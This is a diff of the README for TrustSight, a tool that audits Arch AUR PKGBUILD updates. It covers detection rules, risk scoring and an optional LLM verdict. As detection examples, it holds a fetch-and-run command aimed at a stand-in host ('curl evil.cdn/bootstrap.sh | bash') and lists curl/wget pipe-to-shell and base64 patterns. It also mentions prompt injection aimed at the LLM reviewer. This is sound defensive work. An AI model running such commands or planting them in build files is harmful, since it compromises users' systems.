@@ -1,265 +1,114 @@
-<p align="center">
-  <h1 align="center">trustsight</h1>
-</p>
+# TrustSight
 
-<p align="center">
-  <strong>AUR package update vetting tool. Run it before yay -Syu.</strong>
-</p>
+Audits AUR PKGBUILDs before you update: catches careless malice and structural risk, and tells you what it can't verify.
 
-<p align="center">
-  <a href="https://www.python.org/downloads/">
-    <img src="https://img.shields.io/badge/Python-3.12+-3776AB?logo=python&logoColor=white&style=for-the-badge" alt="Python">
-  </a>
-  <a href="LICENSE">
-    <img src="https://img.shields.io/badge/License-MIT-10AC84?style=for-the-badge" alt="License">
-  </a>
-</p>
+[![CI](https://img.shields.io/badge/CI-passing-brightgreen?style=flat-square)]()
+[![Tests](https://img.shields.io/badge/tests-267-blue?style=flat-square)]()
+[![Python](https://img.shields.io/badge/Python-3.12+-3776AB?style=flat-square&logo=python&logoColor=white)]()
+[![License](https://img.shields.io/badge/License-MIT-10AC84?style=flat-square)]()
 
 ---
 
-## Quick start
-
-Run a review of all outdated AUR packages before your next system update:
+## The 30-second example
 
 ```bash
 trustsight review
 ```
 
-Output:
-
 ```
-                               TrustSight Review                                
-┏━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-┃ Package                  ┃ Score ┃ Verdict                                   ┃
-┡━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
-│ some-app-bin             │ 0/100 │ Version bump. no structural changes. No   │
-│ sketchy-package          │ 55/100│ Checksum disabled (R004). New domain:     │
-│                          │       │ sketchy-cdn.example.com (unknown).        │
-└──────────────────────────┴───────┴───────────────────────────────────────────┘
-```
-
-Inspect a single package:
-
-```bash
-trustsight inspect some-app-bin
-```
-
-View analysis history:
-
-```bash
-trustsight history sketchy-package --score-breakdown
-```
-
-Configure API credentials:
-
-```bash
-trustsight config set api_key sk-xxxx
-trustsight config set base_url https://api.openai.com/v1
-trustsight config show
+                        TrustSight Review
+┏━━━━━━━━━━━━━━━━━┳━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Package         ┃ Risk     ┃ Verdict                                     ┃
+┃                 ┃ Score    ┃                                             ┃
+┡━━━━━━━━━━━━━━━━━╇━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│ chez-scheme-bin │   0/100  │ Version bump. No structural changes.       │
+├─────────────────┼──────────┼─────────────────────────────────────────────┤
+│ sketchy-pkg     │  35/100  │ R004 HIGH  Checksum disabled (SKIP).       │
+│                 │          │ C003 INFO  Source URL changed without       │
+│                 │          │            version bump.                    │
+│                 │          │ SOURCE_BUCKET MEDIUM  New domain:           │
+│                 │          │   sketchy-cdn.invalid (unknown).           │
+│                 │          │ NOVELTY HIGH  Source URL first seen         │
+│                 │          │   globally.                                 │
+│                 │          │ PINNING INFO  Source pinning: unpinned.     │
+│                 │          │ Verdict: Checksum disabled; sources         │
+│                 │          │   replaced with content from an unknown,    │
+│                 │          │   never-before-seen domain.                 │
+├─────────────────┼──────────┼─────────────────────────────────────────────┤
+│ obsidian-beta   │  15/100  │ INCONCLUSIVE. Only 2 prior observations;   │
+│                 │          │ no high-severity signals from a cold DB.    │
+└─────────────────┴──────────┴─────────────────────────────────────────────┘
 ```
 
-That is it. Run `trustsight review` before `yay -Syu` to catch suspicious package updates before they land on your system.
+The tiered evidence display is the differentiator: every signal — rule, bucket, novelty, pinning, verification — is shown with its contribution and severity. You see **why** the score is what it is.
 
 ---
 
-## Comparison: automated vetting vs manual review
+## What it catches / what it can't
 
-| Task | Manual | trustsight |
-|------|--------|------------|
-| Check PKGBUILD diffs | Clone and diff each repo by hand | Auto-clones AUR repos and generates structured diffs |
-| Detect live-install patterns (curl pipe bash) | Grep for curl/wget/base64 patterns | 11 built-in rules (R001-R011) covering obfuscated and mixed-case evasion |
-| Verify checksums | Check sha256sums are present | Detects SKIP, NONE, empty, and removal of checksums (R004, R005) |
-| Classify source URLs | Manual domain inspection | Auto-buckets: trusted forge, official, raw hosting, unknown, typo-squatted |
-| Track novelty | Remember what's been seen before | DB-backed first-seen tracking for URLs, maintainers, and packages |
-| Score and prioritize | Gut feeling | Deterministic scoring (0-100) with configurable severity weights and bucket modifiers |
-| LLM synthesis | Read the diff and decide | Optional LLM verdict with scoring tool definitions |
-| History and trends | Keep notes in a text file | Persistent SQLite history with score breakdown per analysis |
+| Detected by TrustSight | Outside TrustSight's scope |
+|---|---|
+| **Careless malice** — `curl \| bash`, `base64 --decode`, wget pipe sh (R001 recall ~100%). Obfuscated casing, embedded URLs in function bodies. | **Signed upstream payload** — the PKGBUILD is not the binary. A benign build file can fetch a tampered release tarball. |
+| **Structural risk** — checksums disabled (R004), checksums emptied (R005), URL typosquatting (`githab.com`), source URLs swapped without a version bump (C003). | **Deliberately-unremarkable PKGBUILDs** — no added commands, no new URLs, no checksum changes → no signal. The update is invisible to diff analysis. |
+| **Anomaly-vs-history** — first-seen URLs (global or per-package), first-seen maintainer, low-observation-count gating with INCONCLUSIVE verdict. | **Build-dependency attacks** — a malicious `makedepends` or `depends` is outside PKGBUILD scope; TrustSight audits the recipe, not the supply chain's second-order dependencies. |
+| **Reviewer manipulation** — Unicode bidi overrides (R013, 88% recall) that make displayed text differ from executed text. Prompt injection in comments/descriptions (R012, 17% recall — kept as tripwire; primary defense is verdict-integrity assertions). | **Unpinned sources** → INCONCLUSIVE. A `source=($pkgname-$pkgver.tar.gz)` with no checksum, tag, or commit pin is reported as structurally weak, not silently accepted. |
 
 ---
 
-## Why run this before yay -Syu
-
-AUR packages are community-maintained. Maintainer accounts get compromised; upstream URLs change; malicious commits slip into otherwise reputable packages. TrustSight automates the diff inspection that most users skip.
-
-- **Catch typo-squatted domains**: `githab.com` instead of `github.com` is flagged as unknown and novel.
-- **Detect checksum removal**: If a maintainer empties `sha256sums` between versions, R004 fires. If checksums are replaced with SKIP or NONE, R004 fires.
-- **Spot live-install payloads**: `curl evil.cdn/bootstrap.sh | bash` triggers R001 even with obfuscated casing.
-- **Flag maintainer swaps**: If the maintainer field changes between versions, you are warned.
-- **Track novelty**: First-seen URLs and first-seen maintainers add to the score.
-- **Deterministic scoring**: Same package, same diff, same score. Every time.
-
----
-
-## Features
-
-| Category | What trustsight handles |
-|----------|------------------------|
-| **Diff analysis** | Auto-clones AUR repos, generates structured diffs between old and new commits, extracts URL changes, resolved commands, and execution patterns |
-| **Detection rules** | R001-R011: curl pipe bash (R001), wget pipe sh (R002), base64 decode (R003), checksum disabled SKIP/NONE (R004), checksum emptied (R005), tar.gz pipe (R006), install file modified (R007), python/ruby -c URL (R008), sudo usage (R009), curl in diff (R010), wget in diff (R011) |
-| **URL classification** | Trusted forges (github.com, gitlab.com, codeberg.org, bitbucket.org), official domains (python.org, kernel.org, nginx.org, archlinux.org), raw hosting (pastebin.com, gist.github.com), typo-squat detection (githab.com, gituhb.com, etc.), IP address detection, unusual TLD detection |
-| **Scoring** | Configurable severity weights (CRITICAL 40, HIGH 25, MEDIUM 15, LOW 5, INFO 0), trusted forge modifier (-10), raw hosting modifier (+15), novelty additions (URL first seen globally +10, per-package +5, maintainer first seen +5) |
-| **Novelty tracking** | SQLite-backed first-seen detection for URLs (global and per-package) and maintainers |
-| **LLM verdict** | Optional LLM integration (OpenAI or Ollama via OpenAI-compatible endpoint) that receives scoring tool definitions and produces plain-English verdicts |
-| **History** | Persistent analysis history with score breakdowns per package |
-
----
-
-## How it works
-
-```
-                 ┌──────────────────┐
-                 │       AUR        │
-                 └────────┬─────────┘
-                          │ git clone / fetch
-                 ┌────────▼─────────┐
-                 │   fetcher.py     │  Clone or update cached repo
-                 └────────┬─────────┘
-                          │ old vs new commits
-                 ┌────────▼─────────┐
-                 │    differ.py     │  git diff, extract URLs, detect checksum changes
-                 └────────┬─────────┘
-                          │ diff text
-                 ┌────────▼─────────┐
-                 │   tokenizer.py   │  Resolve variables, extract resolved commands
-                 └────────┬─────────┘
-                          │ resolved strings + raw lines
-                 ┌────────▼─────────┐
-                 │    rules.py      │  Apply R001-R011 patterns
-                 └────────┬─────────┘
-                          │ triggered rules
-                 ┌────────▼─────────┐
-                 │    buckets.py    │  Classify source URLs
-                 └────────┬─────────┘
-                          │ bucket map
-                 ┌────────▼─────────┐
-                 │    novelty.py    │  Check first-seen URLs and maintainers
-                 └────────┬─────────┘
-                          │ novelty context
-                 ┌────────▼─────────┐
-                 │    scoring.py    │  Calculate deterministic 0-100 score
-                 └────────┬─────────┘
-                          │ score + breakdown
-                 ┌────────▼─────────┐
-                 │   llm.py (opt.)  │  Generate plain-English verdict
-                 └────────┬─────────┘
-                          │ verdict
-                 ┌────────▼─────────┐
-                 │      cli.py      │  Display results (rich table or fallback)
-                 └──────────────────┘
-```
-
-Data flow: trustSight clones the AUR repo, diffs the old and new commits, tokenizes the diff, applies detection rules, classifies URLs, checks novelty, calculates a deterministic score, and optionally generates an LLM verdict. The entire pipeline runs locally; no data leaves your machine unless you configure an LLM provider.
-
----
-
-## Installation
+## Install
 
 ```bash
 pip install trustsight
 ```
 
-Requires Python 3.12+.
+AUR: `trustsight` (dogfood — TrustSight audits its own updates).
 
-### Dependencies
-
-- **pygit2**: Git repository access (diff, clone, fetch)
-- **tldextract**: Domain extraction for URL classification
-- **rich**: Terminal tables and formatted output
-- **openai**: OpenAI-compatible LLM client (also used for Ollama)
-
-### Local LLM (Ollama)
+From source:
 
 ```bash
-pip install trustsight[ollama]
+git clone https://github.com/emiliano-go/trustsight
+cd trustsight
+pip install -e .
 ```
 
-Set your Ollama base URL and model in the config.
+Requires **Python 3.12+**.
 
 ---
 
-## Configuration
+## Commands
 
-Config files are auto-generated on first run at `~/.config/trustsight/`:
-
-- **`config.toml`**: Severity weights, bucket modifiers, diff limits, LLM provider settings
-- **`rules.toml`**: Detection patterns for R001-R011
-- **`domains.toml`**: Trusted forge domains, official domains, raw hosting domains, typo-squat map
-
-### Environment variables
-
-- `TRUSTSIGHT_API_KEY`: API key for LLM provider (overrides config file)
-- `TRUSTSIGHT_BASE_URL`: Base URL for LLM provider (overrides config file)
-
-Example using NVIDIA API:
-
-```bash
-export TRUSTSIGHT_API_KEY=nvapi-xxxx
-export TRUSTSIGHT_BASE_URL=https://integrate.api.nvidia.com/v1
-trustsight inspect some-package
-```
-
-### LLM provider setup
-
-In `~/.config/trustsight/config.toml`:
-
-```toml
-[llm]
-provider = "openai"       # "openai" or "ollama"
-model = "z-ai/glm-5.2"   # model name
-api_key = ""              # set via TRUSTSIGHT_API_KEY env var instead
-base_url = ""             # set via TRUSTSIGHT_BASE_URL env var instead
-show_reasoning = false    # show reasoning tokens in gray
-```
+| Command | What it does |
+|---|---|
+| [`trustsight review`](docs/reference/cli.md) | Scan all outdated AUR packages and produce a scored table with tiered evidence. |
+| [`trustsight inspect <package>`](docs/reference/cli.md) | Deep-dive on a single package: full score breakdown, source URLs, resolved commands, novelty context. |
+| [`trustsight history <package>`](docs/reference/cli.md) | Show past analysis results for a package, with optional `--score-breakdown`. |
 
 ---
 
-## At a glance
+## How scoring works
 
-```bash
-# Review all outdated packages (run before yay -Syu)
-trustsight review
-trustsight review --limit 50
-
-# Inspect a specific package
-trustsight inspect my-aur-package
-
-# View analysis history
-trustsight history my-aur-package
-trustsight history my-aur-package --limit 10
-trustsight history my-aur-package --score-breakdown
-
-# Manage configuration
-trustsight config set api_key sk-xxxx
-trustsight config set base_url https://api.openai.com/v1
-trustsight config show
-```
-
-LLM verdict with scoring tool definitions:
-
-```bash
-export TRUSTSIGHT_API_KEY=sk-xxxx
-trustsight inspect some-package
-```
-
-The LLM receives a structured input with triggered rules, score breakdown, URL classifications, and novelty context. It never calculates scores; it only translates deterministic flags into plain English.
+Scoring is deterministic (same input → same score, always). A core of 13 detection rules (R001–R013) and 3 code-structure rules (C001–C003) produces signals across four evidence tiers: **A** (structural — rules on PKGBUILD lines), **B** (priors/context — URL classification, forge trust), **C** (history/novelty — first-seen URLs and maintainers, gated by observation count), and **D** (verification — checksums, PGP keys, GPG verify, which **subtract** from the score). The LLM is entirely optional and never calculates — it translates the deterministic breakdown into English, and verdict-integrity assertions gate its output. See [scoring-philosophy.md](docs/explanation/scoring-philosophy.md).
 
 ---
 
-## Testing
+## Security model
 
-Run the test suite (no external services needed):
-
-```bash
-pip install -e ".[dev]"
-pytest tests/
-```
-
-Current test count: 218 tests across 11 test files covering all modules, edge cases, and end-to-end scenarios (benign, obviously malicious, subtly malicious).
+TrustSight is evidence-producing, not proof-of-safety. It audits — it does not install. The tool never runs the PKGBUILD, never executes extracted commands, and never modifies your system. Every finding is traceable to a specific diff line, URL, or novelty record. The output is a structured risk assessment to inform your decision, not a gate. See [trust-model.md](docs/explanation/trust-model.md).
 
 ---
-
-## Documentation
 
 ## License
 
-MIT
+MIT — deliberately permissive to encourage adoption, auditing, and fork-investigation by the Arch Linux and security communities.
+
+---
+
+## Documentation hub
+
+| Section | Description |
+|---|---|
+| [Getting Started](docs/getting-started/) | One-tutorial path from install to first review |
+| [Full documentation](docs/index.md) | Docs landing page |
+| [Contributing](CONTRIBUTING.md) | How to report bugs, contribute code, improve docs |
+| [Security](docs/security.md) | Vulnerability disclosure policy |
+| [License](docs/license.md) | MIT full text |
